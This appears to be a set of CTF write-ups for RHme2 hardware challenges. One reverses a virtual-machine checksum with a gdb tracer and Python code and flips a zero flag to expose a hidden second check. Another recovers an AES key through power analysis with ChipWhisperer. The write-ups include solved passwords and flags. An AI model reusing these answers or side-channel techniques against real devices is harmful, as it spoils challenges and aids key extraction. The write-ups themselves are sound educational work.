FLAG:a22b5049a14b23fbe81fdc329e036272
```

# Reversing 300 - The Imposter

The following description is given for this challenge:

> We have found this binary in an abandoned building. The police suspect someone set the building on fire by accident but we KNOW it was arson. Someone was trying to hide a secret plan of attack against the Republic of Wadiya. We think the binary contains the key to a safe that we were able to recover. Reverse the binary and help us find the secret key. You can be the hero we know you are!
> 
> But beware, not everything is what it seems! Wadiyan soldiers are masters of disguise so we might have an impostor on the run.

The same techniques as described above were used to get a binary that can be run using the simduino simulator. A similar approach was used to identify the input loop and the code that processes the input.

The program is a lot more complex this time and does not contain any simple checks on the input. After lots of painful debugging I identified that the binary appears to be some kind of emulator for a different architecture. I tried to identify the architecture but was unsuccesful.

A short summary of what I found during many hours of stepping through the code:

* At address 0x956 an instruction is fetched for the virtual machine
* At address 0x95c the opcode is decoded
* At address 0x972 this instruction is dispatched to a dispatcher
* The virtual architecture seems to have 8 32-bit registers and at least a zero flag (ZF)

I used this information to build a tracer script in gdb that can be used to log the execution of the code in the virtual machine.

```
set $input_count = 0
set $input_str = "ABCDEFGHIJKLMNOP\r\n"

target remote localhost:1234
set height 0
define wb
    break *(void (*)()) ($arg0*2)
end
define ab
    break *(void (*)()) ($arg0)
end

ab 0x11ca # fake serial input received
    commands
    silent
    set $r24 = 0xa
    c
end

ab 0x11d6
commands
    silent
    set $r24 = $input_str[$input_count]
    set $input_count = $input_count + 1
    c
end

wb 0x4ab # Fetch
commands
    silent
    printf "[0x%.2x%.2X] ", $r13, $r12
    c
end


wb 0x4b9 # Dispatch
commands
    silent
    printf "r0: %.8x ", * (unsigned long long*) ($r3*256 + $r2)
    printf "r1: %.8x ", * (unsigned long long*) ($r3*256 + $r2+1*4)
    printf "r2: %.8x ", * (unsigned long long*) ($r3*256 + $r2+2*4)
    printf "r3: %.8x ", * (unsigned long long*) ($r3*256 + $r2+3*4)
    printf "r4: %.8x ", * (unsigned long long*) ($r3*256 + $r2+4*4)
    printf "r5: %.8x ", * (unsigned long long*) ($r3*256 + $r2+5*4)
    printf "r6: %.8x ", * (unsigned long long*) ($r3*256 + $r2+6*4)
    printf "r7: %.8x ", * (unsigned long long*) ($r3*256 + $r2+7*4)
    printf "ZF: %.2x ", $r5
    c
end


wb 0x4ae # Fetched opcode
commands
    silent
    printf"OPCODE: 0x%.2x%.2X ", $r19, $r18
    c
end

wb 0x30d # Actual dispatch jump
commands
	silent
	printf "DISPATCH: 0x%.2x%.2X\n", $r31, $r30
	set $disp = $r31*256 + $r30
	if $disp == 0x0522
	    printf "Jump if zero\n"
	end
	c
end

```

Using this tracer the execution for various inputs can be obtained and compared. By comparing the trace for input ```'A'*16``` with that of ```'B'*16``` it can be observed what the program does.

```
grep ': 0x0522' AAAAAAAAAAAAAAAA.txt BBBBBBBBBBBBBBBB.txt
AAAAAAAAAAAAAAAA.txt:[0x039A] OPCODE: 0xd105 r0: 00000041 r1: 373d3943 r2: b4524b17 r3: fc791d6b r4: 00000000 r5: 00000000 r6: 00000000 r7: 2000085c ZF: ff DISPATCH: 0x0522
AAAAAAAAAAAAAAAA.txt:[0x0544] OPCODE: 0xd105 r0: 00000041 r1: 373d3943 r2: b4524b17 r3: 795f34a2 r4: 00000000 r5: 00000000 r6: 00000000 r7: 2000085c ZF: ff DISPATCH: 0x0522
AAAAAAAAAAAAAAAA.txt:[0x0562] OPCODE: 0xd101 r0: 00000041 r1: 373d3943 r2: 00000000 r3: 00000000 r4: 00000000 r5: 00000000 r6: 00000000 r7: 2000085c ZF: ff DISPATCH: 0x0522
BBBBBBBBBBBBBBBB.txt:[0x039A] OPCODE: 0xd105 r0: 00000042 r1: 373d3943 r2: c0670e2e r3: fc791d6b r4: 00000000 r5: 00000000 r6: 00000000 r7: 2000085c ZF: ff DISPATCH: 0x0522
BBBBBBBBBBBBBBBB.txt:[0x0544] OPCODE: 0xd105 r0: 00000042 r1: 373d3943 r2: c0670e2e r3: 795f34a2 r4: 00000000 r5: 00000000 r6: 00000000 r7: 2000085c ZF: df DISPATCH: 0x0522
BBBBBBBBBBBBBBBB.txt:[0x0562] OPCODE: 0xd101 r0: 00000042 r1: 373d3943 r2: 00000000 r3: 00000000 r4: 00000000 r5: 00000000 r6: 00000000 r7: 2000085c ZF: ff DISPATCH: 0x0522
```

It calculates a checksum based on the input and then compares that to a static 'good' checksum. For 'A'*16 this checksum is 'b4524b17' which is compared against good checksum 'fc791d6b'. The checksum is calculated in two 8 byte parts.

By analyzing the trace and correlating this with disassembly of the binary the checksum algorithm can be obtained:

```
import struct, sys
magic = [0x373d3943, 0xe2a21b5b, 0xe2a21b5b, 0x8e06fd73, 0x8e06fd73, 0x396bdf8b, 0x396bdf8b, 0xf7354e81, 0xe4d0c1a3, 0xa29a3099, 0x9035a3bb, 0x4dff12b1, 0x3b9a85d3, 0xf963f4c9, 0xe6ff67eb, 0x5ba7d770, 0x92644a03, 0x070cb988, 0x3dc92c1b, 0xb2719ba0, 0xe92e0e33, 0x5dd67db8, 0x9492f04b, 0x0c83d59b, 0x3ff7d263, 0xb7e8b7b3, 0xeb5cb47b, 0x634d99cb, 0x96c19693, 0x0eb27be3, 0x422678ab, 0xed8b5ac3, 0xed8b5ac3, 0x98f03cdb, 0x98f03cdb, 0x44551ef3, 0x44551ef3, 0xefba010b, 0xefba010b, 0xad837001, 0x9b1ee323, 0x58e85219, 0x4683c53b, 0x044d3431, 0xf1e8a753, 0x669116d8, 0x9d4d896b, 0x11f5f8f0, 0x48b26b83, 0xbd5adb08, 0xf4174d9b, 0x68bfbd20, 0x9f7c2fb3, 0x176d1503, 0x4ae111cb, 0xc2d1f71b, 0xf645f3e3, 0x6e36d933, 0xa1aad5fb, 0x199bbb4b, 0x4d0fb813, 0xf8749a2b, 0xf8749a2b, 0xa3d97c43]
my_input = sys.argv[1]
inp = list(struct.unpack("<LLLL", my_input))

for x in range(63):
    a1 = (inp[1] << 4) & 0xffffffff
    a2 = (inp[1] >> 5)
    a3 = a1 ^ a2
    a4 = (a3 + inp[1]) & 0xffffffff
    a5 = a4 ^ magic[min(x,63)]

    a6 = a5 + inp[0] & 0xffffffff
    inp[0] = inp[1]
    inp[1] = a6
print "Checksum:", hex(a6)
```

This code indeed yields the correct checksum for the given input.

```
% python checksum.py AAAAAAAAAAAAAAAA
Checksum: 0xb4524b17
% python checksum.py BBBBBBBBBBBBBBBB
Checksum: 0xc0670e2e
```

However we still do not have sufficient information to reverse the algorithm. With the current checksum implementation an 8 byte input yields a 4 byte checksum, which results in a very large number of false positives. However we do not see an additional check in the log files.

It turns out this is because when the checksum is not correct the second check on the checksum is not performed. We can work around this by manipulating the gdb trace script so that the program thinks the first input is correct.

By changing trace.gdb as follows we can alter the execution of the 0x0522 (Jump if zero) opcode.

```
wb 0x30d # Actual dispatch jump
commands
        silent
        printf "DISPATCH: 0x%.2x%.2X\n", $r31, $r30
        set $disp = $r31*256 + $r30
        if $disp == 0x0522
            printf "Jump if zero\n"
    else
        c
        end
end
```

The program now breaks as follows:
```
[0x0396] OPCODE: 0x6fBB r0: 00000042 r1: 373d3943 r2: c0670e2e r3: 2000086c r4: 00000000 r5: 00000000 r6: 00000000 r7: 2000085c ZF: 6c DISPATCH: 0x04F1
[0x0398] OPCODE: 0x429A r0: 00000042 r1: 373d3943 r2: c0670e2e r3: fc791d6b r4: 00000000 r5: 00000000 r6: 00000000 r7: 2000085c ZF: 6c DISPATCH: 0x04DB
[0x039A] OPCODE: 0xd105 r0: 00000042 r1: 373d3943 r2: c0670e2e r3: fc791d6b r4: 00000000 r5: 00000000 r6: 00000000 r7: 2000085c ZF: ff DISPATCH: 0x0522
Jump if zero
(gdb)
```

We can now set the zero flag (mapped to $r5) to zero:
```
(gdb) set $r5 = 0
```

By doing this a new check appears:

```
[0x03A6] OPCODE: 0xd003 r0: 00000042 r1: 373d3943 r2: 05e15995 r3: 924e6c8f r4: 00000000 r5: 00000000 r6: 00000000 r7: 2000085c ZF: ff DISPATCH: 0x0522
```

What happens is the checksum algorithm runs for an additional round and checks the output against '924e6c8f'.

This means for the first 8 bytes of input there are two checksums:

* After 63 rounds the checksum should be fc791d6b
* After 64 rounds the checksum should be 924e6c8f

For the second 8 bytes we find two checks as well:

* After 63 rounds the checksum should be 795f34a2
* After 64 rounds the checksum should be 0edae901

Now we finally have enough input to contruct a solution, see [imposter.py](imposter.py) for the final solution.

```
% python imposter.py
4rM_c0rT3xM0_4vR
```

Providing this input to the board yields the real flag:

```
Please enter your password
4rM_c0rT3xM0_4vR
FLAG:3f272891072dde378dee841a08c4014b
```

# Reversing 400 - FridgeJIT

Refer to the [FridgeJIT](fridgejit/README.md) section.


### File: rhme2_writeups/sca/README.md

# SCA 100 - Piece of scake

The following description is given for this challenge:

> This is an easy SCA challenge using a cipher implementation without any SCA or DFA countermeasures. Find the key used to encrypt and decrypt messages. Please, consider both SCA and DFA attacks.
> 
> To encrypt a message, send the letter 'e' followed of 16 bytes. To decrypt a message, send the letter 'd' followed of 16 bytes.

The challenge requires side channel analysis. The first step I performed was using the logic analyzer to identify if any of the digital or analogue PINs provided any output during the encryption operation. It turns out that right after input is sent to the board D13 (LED) goes high and right before output is sent is goed low again. This means that D13 can be used as a trigger to identify the code where the encryption is performed.

Apart from the D13 side-channel no other side channels were identified. This leaves one obvious side channel: power usage during encryption/decryption.

In order to measure power usage a simple circuit can be constructed using a 100Ohm shunt resistor connected to the Arduino GND:

```
  5V Power Supply
 Neg           Pos
  |             |
100 Ohm         |
  |             |
  |             |
  GND          +5V
      Arduino
```

In order to improve the quality of the power traces the capacitors that are normally connect to the Arduino's +5V pin need to be removed. This can be done using tweezers and a knife or a soldering iron.

Once the circuit has been created the power consumption can be measured as a voltage across the 100 Ohm resistor. A reasonably fast oscilloscope is required to perform this analysis since it needs to be able to sample at at least 16Hmz which is the clock frequency of the Arduino.

I used a 200Mhz [DSScope](http://www.dreamsourcelab.com/order.html) that I borrowed from a colleague. 

Using the scope we can now setup the D13 pin as a trigger and then capture the voltage across the resistor.

This looks as follows:
![Scope](osc_example.png)

The green line is the D13 output and the yellow line the voltage across the 100 Ohm resistor which is related to the power usage of the board.

In order to perform a power analysis attack a number of traces need to be obtained and analysed. In order to do this I wrote a really ugly plugin for ChipWhisperer that uses screen automation to capture 50 traces using the DSView software.

These traces can then be loaded into the ChipWhisperer software:
![cw_trace_view.png](cw_trace_view.png)

The initial part (up to about 100 on the horizontal axis) is the serial data being read, after this the AES algorithm is executed and we can observe minimal differences in power usage, based on the input. The ChipWhisperer software can be used to reconstruct the key based on these power differences.

In this case the attack works using the default parameters and 50 traces provided:
![cw_results.png](cw_results.png)

The key is obtained using a single execution of the attack.
